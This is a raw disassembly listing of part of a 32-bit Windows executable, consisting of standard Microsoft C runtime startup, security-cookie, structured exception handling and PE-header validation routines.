  40e189:	push   0x401000
  40e18e:	call   0x40e8b0
  40e193:	pop    ecx
  40e194:	pop    ecx
  40e195:	mov    DWORD PTR ds:0x4114c0,0x2
  40e19f:	test   edi,edi
  40e1a1:	jne    0x40e1ac
  40e1a3:	xor    eax,eax
  40e1a5:	mov    ecx,0x4114bc
  40e1aa:	xchg   DWORD PTR [ecx],eax
  40e1ac:	cmp    DWORD PTR ds:0x4114c4,0x0
  40e1b3:	je     0x40e1d8
  40e1b5:	push   0x4114c4
  40e1ba:	call   0x40e6e0
  40e1bf:	pop    ecx
  40e1c0:	test   eax,eax
  40e1c2:	je     0x40e1d8
  40e1c4:	push   ebx
  40e1c5:	push   0x2
  40e1c7:	push   ebx
  40e1c8:	mov    esi,DWORD PTR ds:0x4114c4
  40e1ce:	mov    ecx,esi
  40e1d0:	call   DWORD PTR ds:0x41228c
  40e1d6:	call   esi
  40e1d8:	push   DWORD PTR ds:0x411060
  40e1de:	push   DWORD PTR ds:0x41105c
  40e1e4:	push   DWORD PTR ds:0x411058
  40e1ea:	call   0x402005
  40e1ef:	add    esp,0xc
  40e1f2:	mov    ds:0x411050,eax
  40e1f7:	cmp    DWORD PTR ds:0x411068,0x0
  40e1fe:	jne    0x40e236
  40e200:	push   eax
  40e201:	call   DWORD PTR ds:0x412214
  40e207:	mov    ecx,DWORD PTR [ebp-0x14]
  40e20a:	mov    eax,DWORD PTR [ecx]
  40e20c:	mov    eax,DWORD PTR [eax]
  40e20e:	mov    DWORD PTR [ebp-0x20],eax
  40e211:	push   ecx
  40e212:	push   eax
  40e213:	call   0x40e5c4
  40e218:	pop    ecx
  40e219:	pop    ecx
  40e21a:	ret    
  40e21b:	mov    esp,DWORD PTR [ebp-0x18]
  40e21e:	mov    eax,DWORD PTR [ebp-0x20]
  40e221:	mov    ds:0x411050,eax
  40e226:	cmp    DWORD PTR ds:0x411068,0x0
  40e22d:	jne    0x40e236
  40e22f:	push   eax
  40e230:	call   DWORD PTR ds:0x412210
  40e236:	cmp    DWORD PTR ds:0x411054,0x0
  40e23d:	jne    0x40e24a
  40e23f:	call   DWORD PTR ds:0x41220c
  40e245:	mov    eax,ds:0x411050
  40e24a:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40e251:	call   0x40e904
  40e256:	ret    
  40e257:	int3   
  40e258:	int3   
  40e259:	int3   
  40e25a:	int3   
  40e25b:	int3   
  40e25c:	mov    edi,edi
  40e25e:	push   ebp
  40e25f:	mov    ebp,esp
  40e261:	push   ecx
  40e262:	mov    eax,ds:0x411004
  40e267:	xor    eax,ebp
  40e269:	mov    DWORD PTR [ebp-0x4],eax
  40e26c:	push   esi
  40e26d:	mov    esi,DWORD PTR [ebp+0x8]
  40e270:	xor    eax,eax
  40e272:	cmp    esi,DWORD PTR [ebp+0xc]
  40e275:	jae    0x40e295
  40e277:	push   edi
  40e278:	test   eax,eax
  40e27a:	jne    0x40e294
  40e27c:	mov    edi,DWORD PTR [esi]
  40e27e:	test   edi,edi
  40e280:	je     0x40e28c
  40e282:	mov    ecx,edi
  40e284:	call   DWORD PTR ds:0x41228c
  40e28a:	call   edi
  40e28c:	add    esi,0x4
  40e28f:	cmp    esi,DWORD PTR [ebp+0xc]
  40e292:	jb     0x40e278
  40e294:	pop    edi
  40e295:	mov    ecx,DWORD PTR [ebp-0x4]
  40e298:	xor    ecx,ebp
  40e29a:	pop    esi
  40e29b:	call   0x40e2c0
  40e2a0:	mov    esp,ebp
  40e2a2:	pop    ebp
  40e2a3:	ret    
  40e2a4:	int3   
  40e2a5:	int3   
  40e2a6:	int3   
  40e2a7:	int3   
  40e2a8:	int3   
  40e2a9:	int3   
  40e2aa:	int3   
  40e2ab:	int3   
  40e2ac:	int3   
  40e2ad:	int3   
  40e2ae:	int3   
  40e2af:	int3   
  40e2b0:	call   0x40e7e8
  40e2b5:	jmp    0x40e0e8
  40e2ba:	int3   
  40e2bb:	int3   
  40e2bc:	int3   
  40e2bd:	int3   
  40e2be:	int3   
  40e2bf:	int3   
  40e2c0:	cmp    ecx,DWORD PTR ds:0x411004
  40e2c6:	jne    0x40e2cb
  40e2c8:	ret    0x0
  40e2cb:	jmp    0x40e448
  40e2d0:	int3   
  40e2d1:	int3   
  40e2d2:	int3   
  40e2d3:	int3   
  40e2d4:	int3   
  40e2d5:	int3   
  40e2d6:	int3   
  40e2d7:	int3   
  40e2d8:	int3   
  40e2d9:	int3   
  40e2da:	int3   
  40e2db:	int3   
  40e2dc:	int3   
  40e2dd:	int3   
  40e2de:	int3   
  40e2df:	int3   
  40e2e0:	mov    edi,edi
  40e2e2:	push   ebp
  40e2e3:	mov    ebp,esp
  40e2e5:	push   esi
  40e2e6:	mov    esi,ecx
  40e2e8:	call   DWORD PTR ds:0x4121fc
  40e2ee:	test   BYTE PTR [ebp+0x8],0x1
  40e2f2:	je     0x40e2fb
  40e2f4:	push   esi
  40e2f5:	call   0x40df9b
  40e2fa:	pop    ecx
  40e2fb:	mov    eax,esi
  40e2fd:	pop    esi
  40e2fe:	pop    ebp
  40e2ff:	ret    0x4
  40e302:	int3   
  40e303:	int3   
  40e304:	int3   
  40e305:	int3   
  40e306:	int3   
  40e307:	push   0x10
  40e309:	push   0x410d58
  40e30e:	call   0x40e8bc
  40e313:	and    DWORD PTR [ebp-0x20],0x0
  40e317:	mov    ebx,DWORD PTR [ebp+0xc]
  40e31a:	mov    eax,ebx
  40e31c:	mov    edi,DWORD PTR [ebp+0x10]
  40e31f:	imul   eax,edi
  40e322:	mov    esi,DWORD PTR [ebp+0x8]
  40e325:	add    esi,eax
  40e327:	mov    DWORD PTR [ebp+0x8],esi
  40e32a:	and    DWORD PTR [ebp-0x4],0x0
  40e32e:	sub    edi,0x1
  40e331:	mov    DWORD PTR [ebp+0x10],edi
  40e334:	js     0x40e34b
  40e336:	sub    esi,ebx
  40e338:	mov    DWORD PTR [ebp+0x8],esi
  40e33b:	mov    ecx,DWORD PTR [ebp+0x14]
  40e33e:	call   DWORD PTR ds:0x41228c
  40e344:	mov    ecx,esi
  40e346:	call   DWORD PTR [ebp+0x14]
  40e349:	jmp    0x40e32e
  40e34b:	xor    eax,eax
  40e34d:	inc    eax
  40e34e:	mov    DWORD PTR [ebp-0x20],eax
  40e351:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40e358:	call   0x40e371
  40e35d:	call   0x40e904
  40e362:	ret    0x10
  40e365:	mov    edi,DWORD PTR [ebp+0x10]
  40e368:	mov    ebx,DWORD PTR [ebp+0xc]
  40e36b:	mov    esi,DWORD PTR [ebp+0x8]
  40e36e:	mov    eax,DWORD PTR [ebp-0x20]
  40e371:	test   eax,eax
  40e373:	jne    0x40e380
  40e375:	push   DWORD PTR [ebp+0x14]
  40e378:	push   edi
  40e379:	push   ebx
  40e37a:	push   esi
  40e37b:	call   0x40e386
  40e380:	ret    
  40e381:	int3   
  40e382:	int3   
  40e383:	int3   
  40e384:	int3   
  40e385:	int3   
  40e386:	push   0x18
  40e388:	push   0x410d78
  40e38d:	call   0x40e8bc
  40e392:	and    DWORD PTR [ebp-0x4],0x0
  40e396:	sub    DWORD PTR [ebp+0x10],0x1
  40e39a:	js     0x40e3e2
  40e39c:	mov    esi,DWORD PTR [ebp+0x8]
  40e39f:	sub    esi,DWORD PTR [ebp+0xc]
  40e3a2:	mov    DWORD PTR [ebp+0x8],esi
  40e3a5:	mov    ecx,DWORD PTR [ebp+0x14]
  40e3a8:	call   DWORD PTR ds:0x41228c
  40e3ae:	mov    ecx,esi
  40e3b0:	call   DWORD PTR [ebp+0x14]
  40e3b3:	jmp    0x40e396
  40e3b5:	mov    eax,DWORD PTR [ebp-0x14]
  40e3b8:	mov    DWORD PTR [ebp-0x24],eax
  40e3bb:	mov    eax,DWORD PTR [ebp-0x24]
  40e3be:	mov    eax,DWORD PTR [eax]
  40e3c0:	mov    DWORD PTR [ebp-0x20],eax
  40e3c3:	mov    eax,DWORD PTR [ebp-0x20]
  40e3c6:	cmp    DWORD PTR [eax],0xe06d7363
  40e3cc:	je     0x40e3d9
  40e3ce:	mov    DWORD PTR [ebp-0x28],0x0
  40e3d5:	mov    eax,DWORD PTR [ebp-0x28]
  40e3d8:	ret    
  40e3d9:	call   DWORD PTR ds:0x4121f8
  40e3df:	mov    esp,DWORD PTR [ebp-0x18]
  40e3e2:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40e3e9:	call   0x40e904
  40e3ee:	ret    0x10
  40e3f1:	int3   
  40e3f2:	int3   
  40e3f3:	int3   
  40e3f4:	int3   
  40e3f5:	int3   
  40e3f6:	jmp    DWORD PTR ds:0x412234
  40e3fc:	int3   
  40e3fd:	int3   
  40e3fe:	int3   
  40e3ff:	int3   
  40e400:	int3   
  40e401:	int3   
  40e402:	jmp    DWORD PTR ds:0x412230
  40e408:	int3   
  40e409:	int3   
  40e40a:	int3   
  40e40b:	int3   
  40e40c:	int3   
  40e40d:	int3   
  40e40e:	jmp    DWORD PTR ds:0x4121e4
  40e414:	int3   
  40e415:	int3   
  40e416:	int3   
  40e417:	int3   
  40e418:	int3   
  40e419:	mov    edi,edi
  40e41b:	push   ebp
  40e41c:	mov    ebp,esp
  40e41e:	push   0x0
  40e420:	call   DWORD PTR ds:0x4120b4
  40e426:	push   DWORD PTR [ebp+0x8]
  40e429:	call   DWORD PTR ds:0x4120b8
  40e42f:	push   0xc0000409
  40e434:	call   DWORD PTR ds:0x4120b0
  40e43a:	push   eax
  40e43b:	call   DWORD PTR ds:0x4120ac
  40e441:	pop    ebp
  40e442:	ret    
  40e443:	int3   
  40e444:	int3   
  40e445:	int3   
  40e446:	int3   
  40e447:	int3   
  40e448:	mov    edi,edi
  40e44a:	push   ebp
  40e44b:	mov    ebp,esp
  40e44d:	sub    esp,0x324
  40e453:	mov    ds:0x411170,eax
  40e458:	mov    DWORD PTR ds:0x41116c,ecx
  40e45e:	mov    DWORD PTR ds:0x411168,edx
  40e464:	mov    DWORD PTR ds:0x411164,ebx
  40e46a:	mov    DWORD PTR ds:0x411160,esi
  40e470:	mov    DWORD PTR ds:0x41115c,edi
  40e476:	data16 mov WORD PTR ds:0x411188,ss
  40e47d:	data16 mov WORD PTR ds:0x41117c,cs
  40e484:	data16 mov WORD PTR ds:0x411158,ds
  40e48b:	data16 mov WORD PTR ds:0x411154,es
  40e492:	data16 mov WORD PTR ds:0x411150,fs
  40e499:	data16 mov WORD PTR ds:0x41114c,gs
  40e4a0:	pushf  
  40e4a1:	pop    DWORD PTR ds:0x411180
  40e4a7:	mov    eax,DWORD PTR [ebp+0x0]
  40e4aa:	mov    ds:0x411174,eax
  40e4af:	mov    eax,DWORD PTR [ebp+0x4]
  40e4b2:	mov    ds:0x411178,eax
  40e4b7:	lea    eax,[ebp+0x8]
  40e4ba:	mov    ds:0x411184,eax
  40e4bf:	mov    eax,DWORD PTR [ebp-0x324]
  40e4c5:	mov    DWORD PTR ds:0x4110c0,0x10001
  40e4cf:	mov    eax,ds:0x411178
  40e4d4:	mov    ds:0x41107c,eax
  40e4d9:	mov    DWORD PTR ds:0x411070,0xc0000409
  40e4e3:	mov    DWORD PTR ds:0x411074,0x1
  40e4ed:	mov    DWORD PTR ds:0x411080,0x3
  40e4f7:	push   0x4
  40e4f9:	pop    eax
  40e4fa:	imul   eax,eax,0x0
  40e4fd:	mov    DWORD PTR [eax+0x411084],0x2
  40e507:	push   0x4
  40e509:	pop    eax
  40e50a:	shl    eax,0x0
  40e50d:	mov    ecx,DWORD PTR ds:0x411004
  40e513:	mov    DWORD PTR [eax+0x411084],ecx
  40e519:	push   0x4
  40e51b:	pop    eax
  40e51c:	shl    eax,1
  40e51e:	mov    ecx,DWORD PTR ds:0x411008
  40e524:	mov    DWORD PTR [eax+0x411084],ecx
  40e52a:	push   0x4
  40e52c:	pop    eax
  40e52d:	imul   eax,eax,0x0
  40e530:	mov    ecx,DWORD PTR ds:0x411004
  40e536:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  40e53a:	push   0x4
  40e53c:	pop    eax
  40e53d:	shl    eax,0x0
  40e540:	mov    ecx,DWORD PTR ds:0x411008
  40e546:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  40e54a:	push   0x401064
  40e54f:	call   0x40e419
  40e554:	mov    esp,ebp
  40e556:	pop    ebp
  40e557:	ret    
  40e558:	int3   
  40e559:	int3   
  40e55a:	int3   
  40e55b:	int3   
  40e55c:	int3   
  40e55d:	int3   
  40e55e:	int3   
  40e55f:	int3   
  40e560:	mov    edi,edi
  40e562:	push   ebp
  40e563:	mov    ebp,esp
  40e565:	mov    eax,DWORD PTR [ebp+0x8]
  40e568:	mov    eax,DWORD PTR [eax]
  40e56a:	cmp    DWORD PTR [eax],0xe06d7363
  40e570:	jne    0x40e59d
  40e572:	cmp    DWORD PTR [eax+0x10],0x3
  40e576:	jne    0x40e59d
  40e578:	mov    eax,DWORD PTR [eax+0x14]
  40e57b:	cmp    eax,0x19930520
  40e580:	je     0x40e597
  40e582:	cmp    eax,0x19930521
  40e587:	je     0x40e597
  40e589:	cmp    eax,0x19930522
  40e58e:	je     0x40e597
  40e590:	cmp    eax,0x1994000
  40e595:	jne    0x40e59d
  40e597:	call   DWORD PTR ds:0x4121f8
  40e59d:	xor    eax,eax
  40e59f:	pop    ebp
  40e5a0:	ret    0x4
  40e5a3:	int3   
  40e5a4:	int3   
  40e5a5:	int3   
  40e5a6:	int3   
  40e5a7:	int3   
  40e5a8:	int3   
  40e5a9:	int3   
  40e5aa:	int3   
  40e5ab:	int3   
  40e5ac:	int3   
  40e5ad:	int3   
  40e5ae:	int3   
  40e5af:	int3   
  40e5b0:	push   0x40e560
  40e5b5:	call   DWORD PTR ds:0x4120b4
  40e5bb:	xor    eax,eax
  40e5bd:	ret    
  40e5be:	int3   
  40e5bf:	int3   
  40e5c0:	int3   
  40e5c1:	int3   
  40e5c2:	int3   
  40e5c3:	int3   
  40e5c4:	jmp    DWORD PTR ds:0x412228
  40e5ca:	int3   
  40e5cb:	int3   
  40e5cc:	int3   
  40e5cd:	int3   
  40e5ce:	int3   
  40e5cf:	push   0xc
  40e5d1:	push   0x410d98
  40e5d6:	call   0x40e958
  40e5db:	xor    ecx,ecx
  40e5dd:	mov    eax,DWORD PTR [ebp+0x8]
  40e5e0:	test   eax,eax
  40e5e2:	je     0x40e62f
  40e5e4:	cmp    eax,0xffffffff
  40e5e7:	je     0x40e62f
  40e5e9:	mov    DWORD PTR [ebp-0x4],ecx
  40e5ec:	mov    edx,0x5a4d
  40e5f1:	cmp    WORD PTR [eax],dx
  40e5f4:	jne    0x40e628
  40e5f6:	mov    edx,DWORD PTR [eax+0x3c]
  40e5f9:	test   edx,edx
  40e5fb:	js     0x40e628
  40e5fd:	cmp    edx,0x10000000
  40e603:	jae    0x40e628
  40e605:	add    eax,edx
  40e607:	mov    DWORD PTR [ebp-0x1c],eax
  40e60a:	mov    ecx,DWORD PTR [eax]
  40e60c:	sub    ecx,0x4550
  40e612:	neg    ecx
  40e614:	sbb    ecx,ecx
  40e616:	not    ecx
  40e618:	and    ecx,eax
  40e61a:	jmp    0x40e625
  40e61c:	xor    eax,eax
  40e61e:	inc    eax
  40e61f:	ret    
  40e620:	mov    esp,DWORD PTR [ebp-0x18]
  40e623:	xor    ecx,ecx
  40e625:	mov    DWORD PTR [ebp-0x1c],ecx
  40e628:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40e62f:	mov    eax,ecx
  40e631:	call   0x40e99d
  40e636:	ret    0x4
  40e639:	int3   
  40e63a:	int3   
  40e63b:	int3   
  40e63c:	int3   
  40e63d:	int3   
  40e63e:	mov    edi,edi
  40e640:	push   ebp
  40e641:	mov    ebp,esp
  40e643:	push   0x0
  40e645:	call   DWORD PTR ds:0x4120a8
  40e64b:	test   eax,eax
  40e64d:	je     0x40e66f
  40e64f:	push   eax
  40e650:	call   0x40e5cf
  40e655:	test   eax,eax
  40e657:	je     0x40e66f
  40e659:	movzx  ecx,WORD PTR [eax+0x5c]
  40e65d:	push   0x2
  40e65f:	pop    eax
  40e660:	cmp    cx,ax
  40e663:	je     0x40e672
  40e665:	cmp    ecx,0x3
  40e668:	jne    0x40e66f
  40e66a:	xor    eax,eax
  40e66c:	inc    eax
  40e66d:	pop    ebp
  40e66e:	ret    
  40e66f:	mov    eax,DWORD PTR [ebp+0x8]
  40e672:	pop    ebp
  40e673:	ret    
  40e674:	int3   
  40e675:	int3   
  40e676:	int3   
  40e677:	int3   
  40e678:	int3   
  40e679:	int3   
  40e67a:	jmp    DWORD PTR ds:0x412220
  40e680:	int3   
  40e681:	int3   
  40e682:	int3   
  40e683:	int3   
  40e684:	int3   
  40e685:	int3   
  40e686:	int3   
  40e687:	int3   
  40e688:	int3   
  40e689:	int3   
  40e68a:	int3   
  40e68b:	int3   
  40e68c:	int3   
  40e68d:	int3   
  40e68e:	int3   
  40e68f:	int3   
  40e690:	mov    edi,edi
  40e692:	push   ebp
  40e693:	mov    ebp,esp
  40e695:	mov    eax,DWORD PTR [ebp+0x8]
  40e698:	xor    edx,edx
  40e69a:	push   ebx
  40e69b:	push   esi
  40e69c:	push   edi
  40e69d:	mov    ecx,DWORD PTR [eax+0x3c]
  40e6a0:	add    ecx,eax
  40e6a2:	movzx  eax,WORD PTR [ecx+0x14]
  40e6a6:	movzx  ebx,WORD PTR [ecx+0x6]
  40e6aa:	add    eax,0x18
  40e6ad:	add    eax,ecx
  40e6af:	test   ebx,ebx
  40e6b1:	je     0x40e6ce
  40e6b3:	mov    edi,DWORD PTR [ebp+0xc]
  40e6b6:	mov    esi,DWORD PTR [eax+0xc]
  40e6b9:	cmp    edi,esi
  40e6bb:	jb     0x40e6c6
  40e6bd:	mov    ecx,DWORD PTR [eax+0x8]
  40e6c0:	add    ecx,esi
  40e6c2:	cmp    edi,ecx
  40e6c4:	jb     0x40e6d0
  40e6c6:	inc    edx
  40e6c7:	add    eax,0x28
  40e6ca:	cmp    edx,ebx
  40e6cc:	jb     0x40e6b6
  40e6ce:	xor    eax,eax
  40e6d0:	pop    edi
  40e6d1:	pop    esi
  40e6d2:	pop    ebx
  40e6d3:	pop    ebp
  40e6d4:	ret    
  40e6d5:	int3   
  40e6d6:	int3   
  40e6d7:	int3   
  40e6d8:	int3   
  40e6d9:	int3   
  40e6da:	int3   
  40e6db:	int3   
  40e6dc:	int3   
  40e6dd:	int3   
  40e6de:	int3   
  40e6df:	int3   
  40e6e0:	mov    edi,edi
  40e6e2:	push   ebp
  40e6e3:	mov    ebp,esp
  40e6e5:	push   0xfffffffe
  40e6e7:	push   0x410db8
  40e6ec:	push   0x40e920
  40e6f1:	mov    eax,fs:0x0
  40e6f7:	push   eax
  40e6f8:	sub    esp,0x8
  40e6fb:	push   ebx
  40e6fc:	push   esi
  40e6fd:	push   edi
  40e6fe:	mov    eax,ds:0x411004
  40e703:	xor    DWORD PTR [ebp-0x8],eax
  40e706:	xor    eax,ebp
  40e708:	push   eax
  40e709:	lea    eax,[ebp-0x10]
  40e70c:	mov    fs:0x0,eax
  40e712:	mov    DWORD PTR [ebp-0x18],esp
  40e715:	mov    DWORD PTR [ebp-0x4],0x0
  40e71c:	push   0x400000
  40e721:	call   0x40e7b0
  40e726:	add    esp,0x4
  40e729:	test   eax,eax
  40e72b:	je     0x40e781
  40e72d:	mov    eax,DWORD PTR [ebp+0x8]
  40e730:	sub    eax,0x400000
  40e735:	push   eax
  40e736:	push   0x400000
  40e73b:	call   0x40e690
  40e740:	add    esp,0x8
  40e743:	test   eax,eax
  40e745:	je     0x40e781
  40e747:	mov    eax,DWORD PTR [eax+0x24]
  40e74a:	shr    eax,0x1f
  40e74d:	not    eax
  40e74f:	and    eax,0x1
  40e752:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40e759:	mov    ecx,DWORD PTR [ebp-0x10]
  40e75c:	mov    DWORD PTR fs:0x0,ecx
  40e763:	pop    ecx
  40e764:	pop    edi
  40e765:	pop    esi
  40e766:	pop    ebx
  40e767:	mov    esp,ebp
  40e769:	pop    ebp
  40e76a:	ret    
  40e76b:	mov    eax,DWORD PTR [ebp-0x14]
  40e76e:	mov    eax,DWORD PTR [eax]
  40e770:	xor    ecx,ecx
  40e772:	cmp    DWORD PTR [eax],0xc0000005
  40e778:	sete   cl
  40e77b:	mov    eax,ecx
  40e77d:	ret    
  40e77e:	mov    esp,DWORD PTR [ebp-0x18]
  40e781:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40e788:	xor    eax,eax
  40e78a:	mov    ecx,DWORD PTR [ebp-0x10]
  40e78d:	mov    DWORD PTR fs:0x0,ecx
  40e794:	pop    ecx
  40e795:	pop    edi
  40e796:	pop    esi
  40e797:	pop    ebx
  40e798:	mov    esp,ebp
  40e79a:	pop    ebp
  40e79b:	ret    
  40e79c:	int3   
  40e79d:	int3   
  40e79e:	int3   
  40e79f:	int3   
  40e7a0:	int3   
  40e7a1:	int3   
  40e7a2:	int3   
  40e7a3:	int3   
  40e7a4:	int3   
  40e7a5:	int3   
  40e7a6:	int3   
  40e7a7:	int3   
  40e7a8:	int3   
  40e7a9:	int3   
  40e7aa:	int3   
  40e7ab:	int3   
  40e7ac:	int3   
  40e7ad:	int3   
  40e7ae:	int3   
  40e7af:	int3   
  40e7b0:	mov    edi,edi
  40e7b2:	push   ebp
  40e7b3:	mov    ebp,esp
  40e7b5:	mov    eax,DWORD PTR [ebp+0x8]
  40e7b8:	mov    ecx,0x5a4d
  40e7bd:	cmp    WORD PTR [eax],cx
  40e7c0:	je     0x40e7c6
  40e7c2:	xor    eax,eax
  40e7c4:	pop    ebp
  40e7c5:	ret    
  40e7c6:	mov    ecx,DWORD PTR [eax+0x3c]
  40e7c9:	add    ecx,eax
  40e7cb:	xor    eax,eax
  40e7cd:	cmp    DWORD PTR [ecx],0x4550
  40e7d3:	jne    0x40e7e1
  40e7d5:	mov    edx,0x10b
  40e7da:	cmp    WORD PTR [ecx+0x18],dx
  40e7de:	sete   al
  40e7e1:	pop    ebp
  40e7e2:	ret    
  40e7e3:	int3   
  40e7e4:	int3   
  40e7e5:	int3   
  40e7e6:	int3   
  40e7e7:	int3   
  40e7e8:	mov    edi,edi
  40e7ea:	push   ebp
  40e7eb:	mov    ebp,esp
  40e7ed:	sub    esp,0x14
  40e7f0:	and    DWORD PTR [ebp-0xc],0x0
  40e7f4:	and    DWORD PTR [ebp-0x8],0x0
  40e7f8:	mov    eax,ds:0x411004
  40e7fd:	push   esi
  40e7fe:	push   edi
  40e7ff:	mov    edi,0xbb40e64e
  40e804:	mov    esi,0xffff0000
  40e809:	cmp    eax,edi
  40e80b:	je     0x40e81a
  40e80d:	test   esi,eax
  40e80f:	je     0x40e81a
  40e811:	not    eax
  40e813:	mov    ds:0x411008,eax
  40e818:	jmp    0x40e884
  40e81a:	lea    eax,[ebp-0xc]
  40e81d:	push   eax
  40e81e:	call   DWORD PTR ds:0x41209c
  40e824:	mov    eax,DWORD PTR [ebp-0x8]
  40e827:	xor    eax,DWORD PTR [ebp-0xc]
  40e82a:	mov    DWORD PTR [ebp-0x4],eax
  40e82d:	call   DWORD PTR ds:0x4120a4
  40e833:	xor    DWORD PTR [ebp-0x4],eax
  40e836:	call   DWORD PTR ds:0x4120a0
  40e83c:	xor    DWORD PTR [ebp-0x4],eax
  40e83f:	call   DWORD PTR ds:0x412098
  40e845:	xor    eax,DWORD PTR [ebp-0x4]
  40e848:	lea    ecx,[ebp-0x4]
  40e84b:	xor    eax,ecx
  40e84d:	mov    DWORD PTR [ebp-0x4],eax
  40e850:	lea    eax,[ebp-0x14]
  40e853:	push   eax
  40e854:	call   DWORD PTR ds:0x4120d4
  40e85a:	mov    eax,DWORD PTR [ebp-0x10]
  40e85d:	xor    eax,DWORD PTR [ebp-0x14]
  40e860:	mov    ecx,DWORD PTR [ebp-0x4]
  40e863:	xor    ecx,eax
  40e865:	cmp    ecx,edi
  40e867:	je     0x40e871
  40e869:	test   DWORD PTR ds:0x411004,esi
  40e86f:	jne    0x40e876
  40e871:	mov    ecx,0xbb40e64f
  40e876:	mov    DWORD PTR ds:0x411004,ecx
  40e87c:	not    ecx
  40e87e:	mov    DWORD PTR ds:0x411008,ecx
  40e884:	pop    edi
  40e885:	pop    esi
  40e886:	mov    esp,ebp
  40e888:	pop    ebp
  40e889:	ret    
  40e88a:	int3   
  40e88b:	int3   
  40e88c:	int3   
  40e88d:	int3   
  40e88e:	int3   
  40e88f:	int3   
  40e890:	xor    eax,eax
  40e892:	ret    
  40e893:	int3   
  40e894:	int3   
  40e895:	int3   
  40e896:	int3   
  40e897:	int3   
  40e898:	push   0x30000
  40e89d:	push   0x10000
  40e8a2:	call   DWORD PTR ds:0x4121f4
  40e8a8:	pop    ecx
  40e8a9:	pop    ecx
  40e8aa:	ret    
  40e8ab:	int3   
  40e8ac:	int3   
  40e8ad:	int3   
  40e8ae:	int3   
  40e8af:	int3   
  40e8b0:	jmp    DWORD PTR ds:0x412200
  40e8b6:	int3   
  40e8b7:	int3   
  40e8b8:	int3   
  40e8b9:	int3   
  40e8ba:	int3   
  40e8bb:	int3   
  40e8bc:	push   0x40e920
  40e8c1:	push   DWORD PTR fs:0x0
  40e8c8:	mov    eax,DWORD PTR [esp+0x10]
  40e8cc:	mov    DWORD PTR [esp+0x10],ebp
  40e8d0:	lea    ebp,[esp+0x10]
  40e8d4:	sub    esp,eax
  40e8d6:	push   ebx
  40e8d7:	push   esi
  40e8d8:	push   edi
  40e8d9:	mov    eax,ds:0x411004
  40e8de:	xor    DWORD PTR [ebp-0x4],eax
  40e8e1:	xor    eax,ebp
  40e8e3:	mov    DWORD PTR [ebp-0x1c],eax
  40e8e6:	push   eax
  40e8e7:	mov    DWORD PTR [ebp-0x18],esp
  40e8ea:	push   DWORD PTR [ebp-0x8]
  40e8ed:	mov    eax,DWORD PTR [ebp-0x4]
  40e8f0:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40e8f7:	mov    DWORD PTR [ebp-0x8],eax
  40e8fa:	lea    eax,[ebp-0x10]
  40e8fd:	mov    fs:0x0,eax
  40e903:	ret    
  40e904:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e907:	xor    ecx,ebp
  40e909:	call   0x40e2c0
  40e90e:	jmp    0x40e99d
  40e913:	int3   
  40e914:	int3   
  40e915:	int3   
  40e916:	int3   
  40e917:	int3   
  40e918:	int3   
  40e919:	int3   
  40e91a:	int3   
  40e91b:	int3   
  40e91c:	int3   
  40e91d:	int3   
  40e91e:	int3   
  40e91f:	int3   
  40e920:	mov    edi,edi
  40e922:	push   ebp
  40e923:	mov    ebp,esp
  40e925:	push   DWORD PTR [ebp+0x14]
  40e928:	push   DWORD PTR [ebp+0x10]
  40e92b:	push   DWORD PTR [ebp+0xc]
  40e92e:	push   DWORD PTR [ebp+0x8]
  40e931:	push   0x40e2c0
  40e936:	push   0x411004
  40e93b:	call   0x40e9b6
  40e940:	add    esp,0x18
  40e943:	pop    ebp
  40e944:	ret    
  40e945:	int3   
  40e946:	int3   
  40e947:	int3   
  40e948:	int3   
  40e949:	int3   
  40e94a:	int3   
  40e94b:	int3   
  40e94c:	int3   
  40e94d:	int3   
  40e94e:	int3   
  40e94f:	int3   
  40e950:	ret    
  40e951:	int3   
  40e952:	int3   
  40e953:	int3   
  40e954:	int3   
  40e955:	int3   
  40e956:	int3   
  40e957:	int3   
  40e958:	push   0x40e920
  40e95d:	push   DWORD PTR fs:0x0
  40e964:	mov    eax,DWORD PTR [esp+0x10]
  40e968:	mov    DWORD PTR [esp+0x10],ebp
  40e96c:	lea    ebp,[esp+0x10]
  40e970:	sub    esp,eax
  40e972:	push   ebx
  40e973:	push   esi
  40e974:	push   edi
  40e975:	mov    eax,ds:0x411004
  40e97a:	xor    DWORD PTR [ebp-0x4],eax
  40e97d:	xor    eax,ebp
  40e97f:	push   eax
  40e980:	mov    DWORD PTR [ebp-0x18],esp
  40e983:	push   DWORD PTR [ebp-0x8]
  40e986:	mov    eax,DWORD PTR [ebp-0x4]
  40e989:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40e990:	mov    DWORD PTR [ebp-0x8],eax
  40e993:	lea    eax,[ebp-0x10]
  40e996:	mov    fs:0x0,eax
  40e99c:	ret    
  40e99d:	mov    ecx,DWORD PTR [ebp-0x10]
  40e9a0:	mov    DWORD PTR fs:0x0,ecx
  40e9a7:	pop    ecx
  40e9a8:	pop    edi
  40e9a9:	pop    edi
  40e9aa:	pop    esi
  40e9ab:	pop    ebx
  40e9ac:	mov    esp,ebp
  40e9ae:	pop    ebp
  40e9af:	push   ecx
  40e9b0:	ret    
  40e9b1:	int3   
  40e9b2:	int3   
  40e9b3:	int3   
  40e9b4:	int3   
  40e9b5:	int3   
  40e9b6:	jmp    DWORD PTR ds:0x4121f0
  40e9bc:	int3   
  40e9bd:	int3   
  40e9be:	int3   
  40e9bf:	int3   
  40e9c0:	int3   
  40e9c1:	mov    edi,edi
  40e9c3:	push   ebp
  40e9c4:	mov    ebp,esp
  40e9c6:	call   0x40e9ec
  40e9cb:	mov    ecx,DWORD PTR [ebp+0x8]
  40e9ce:	shl    ecx,0x5
  40e9d1:	add    eax,ecx
  40e9d3:	pop    ebp
  40e9d4:	ret    
  40e9d5:	int3   
  40e9d6:	int3   
  40e9d7:	int3   
  40e9d8:	int3   
  40e9d9:	int3   
  40e9da:	int3   
  40e9db:	int3   
  40e9dc:	int3   
  40e9dd:	int3   
  40e9de:	int3   
  40e9df:	int3   
  40e9e0:	jmp    DWORD PTR ds:0x4121c0
  40e9e6:	int3   
  40e9e7:	int3   
  40e9e8:	int3   
  40e9e9:	int3   
  40e9ea:	int3   
  40e9eb:	int3   
